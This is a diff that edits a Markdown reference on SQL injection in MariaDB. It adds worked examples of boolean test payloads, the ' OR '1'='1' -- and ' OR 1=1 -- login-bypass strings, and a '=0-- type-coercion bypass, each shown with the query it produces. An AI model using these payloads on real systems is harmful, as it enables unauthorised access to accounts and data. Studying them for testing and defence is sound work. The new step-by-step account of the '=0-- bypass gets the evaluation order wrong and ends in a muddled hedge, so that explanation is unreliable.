@@ -29,6 +29,8 @@ SELECT * FROM Table WHERE id = '1';
 | `\`          | False  | Backslash breaks the syntax          |
 | `\\`         | True   | Two backslashes balance each other   |
 
+> **Note:** Backslash escaping depends on the `sql_mode` setting. When `NO_BACKSLASH_ESCAPES` is enabled, backslashes are treated as literal characters rather than escape sequences. Verify `@@sql_mode` before relying on these examples.
+
 ### Double Quotes as String Delimiters
 
 MariaDB allows double quotes for string values (unlike strict ANSI SQL mode):
@@ -70,15 +72,15 @@ Given the query:
 SELECT * FROM Table WHERE id = 1;
 ```
 
-| Test Payload | Result | Description                            |
-| ------------ | ------ | -------------------------------------- |
-| `AND 1`      | True   | Logical truth maintains query validity |
-| `AND 0`      | False  | Logical false invalidates the query    |
-| `AND true`   | True   | Logical truth maintains query validity |
-| `AND false`  | False  | Logical false invalidates the query    |
-| `1-false`    | -      | Returns 1 if vulnerable                |
-| `1-true`     | -      | Returns 0 if vulnerable                |
-| `1*56`       | -      | Returns 56 if vulnerable, 1 if not     |
+| Test Payload | Result | Description                                           |
+| ------------ | ------ | ----------------------------------------------------- |
+| `AND 1`      | True   | Logical truth maintains query validity                |
+| `AND 0`      | False  | Logical false invalidates the query                   |
+| `AND true`   | True   | Logical truth maintains query validity                |
+| `AND false`  | False  | Logical false invalidates the query                   |
+| `1-false`    | -      | Returns 1 if expression evaluated (false=0, so 1-0=1) |
+| `1-true`     | -      | Returns 0 if expression evaluated (true=1, so 1-1=0)  |
+| `1*56`       | -      | Returns 56 if expression evaluated, 1 if literal      |
 
 ### Boolean Values
 
@@ -156,8 +158,14 @@ The final closing quote from the SQL query structure can absorb an unclosed quot
 
 ```sql
 -- Injection: ' OR '1'='1' --
+-- Original query template: SELECT * FROM users WHERE username = '{input}' AND password = ''
+
+-- After injection:
 SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
--- The username ends with ', starts OR condition with '1'='1', then comments out the rest
+
+-- Effective query (password clause is commented out):
+SELECT * FROM users WHERE username = '' OR '1'='1'
+-- Result: Returns all users since '1'='1' is always true
 ```
 
 ### Classic OR Injection in Password Field
@@ -174,17 +182,36 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '' = '';
 ### OR 1=1 with Comment
 
 ```sql
--- Injection: ' OR 1=1 -- -
-SELECT * FROM users WHERE username = '' OR 1=1 -- -' AND password = ''
--- Returns first user (usually admin)
+-- Injection: ' OR 1=1 --
+-- Note: The -- comment requires a trailing space to work in MariaDB/MySQL.
+-- Some references use "-- -" where the extra dash ensures the space is visible.
+
+-- After injection:
+SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = ''
+
+-- Effective query (everything after -- is ignored):
+SELECT * FROM users WHERE username = '' OR 1=1
+-- Result: Returns all users; typically first user is admin
 ```
 
 ### Type Coercion Bypass
 
 ```sql
 -- Injection: '=0--
--- Query becomes: WHERE username = ''=0-- '
--- ''=0 evaluates due to type coercion, -- comments rest
+-- Original: WHERE username = '{input}' AND password = ''
+
+-- After injection:
+SELECT * FROM users WHERE username = ''=0-- ' AND password = ''
+
+-- Effective query (after -- comment removes the rest):
+SELECT * FROM users WHERE username = ''=0
+
+-- How it works:
+-- 1. ''=0 compares empty string to 0
+-- 2. In MariaDB, '' is coerced to 0 when compared to a number
+-- 3. 0=0 evaluates to 1 (true)
+-- 4. So the WHERE clause becomes: WHERE username = 1
+-- 5. This returns any user where username coerces to 1 (or all if evaluated as boolean)
 ```
 
 ### Balanced Quote Injection
